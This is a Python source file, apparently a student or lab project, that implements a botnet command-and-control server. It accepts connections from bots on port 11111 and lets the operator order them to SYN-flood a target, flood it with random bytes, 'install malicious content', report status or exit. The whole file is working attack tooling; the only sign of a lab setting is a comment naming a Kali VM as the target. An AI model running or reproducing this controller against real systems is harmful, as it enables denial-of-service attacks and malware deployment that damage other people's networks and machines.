#Author: Karun Sharma

import socket
import threading

TARGET = ' '#IP Address of Kali Linux target VM to be read from the config file

with open("Config.txt", 'r') as file:
	content = file.readline()
	TARGET = content[16:]
	TARGET = TARGET.rstrip()


def connectbot(clientsocketsource):
	while True:
		data = clientsocketsource.recv(1024)
		print("Data receieved from bot: {}".format(data))


def sendcommands(clientsocketsaddresssource):
	while True:
		print("Choose the type of command to execute ")
		print("1) SYN Flood\n 2) Install malicious content \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")
		input_get = raw_input()
		duration = 0
		durationofflood = 0
		if int(input_get) == 1:
			duration = raw_input("Enter the duration of the attack in seconds: ")

		if int(input_get) == 4:
			durationofflood = raw_input("Enter duration of flood in seconds")

		for row in clientsocketsaddresssource:
			if int(input_get) == 1:
				command = "\t".join(("SYN FLOOD", str(duration), TARGET))
				row.send(command)

			if int(input_get) == 2:
				row.send("INSTALL")

			if int(input_get) == 3:
				row.send("STATUS")

			if int(input_get) == 4:
				row.send("\t".join(("FLOODING",TARGET,str(durationofflood))))

			if int(input_get) == 5:
				row.send("\t".join(("EXIT",TARGET)))


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('',11111))

s.listen(300)

listofbots = list()
referencestosockets = list()
addresstracker = list()

commandsender = threading.Thread(target=sendcommands, args=(referencestosockets,))
commandsender.start()

while True:
	deletelement = False

	(clientsocket,address) = s.accept()
	addresstracker.append(address)
	referencestosockets.append(clientsocket)
	print('{} is connected'.format(address))
	t = threading.Thread(target=connectbot,args=(clientsocket,))
	listofbots.append(t)
	t.start()

	deletelement = False

for index in listofbots:
	index.join()

commandsender.join()

s.close()
udpsocket.close()
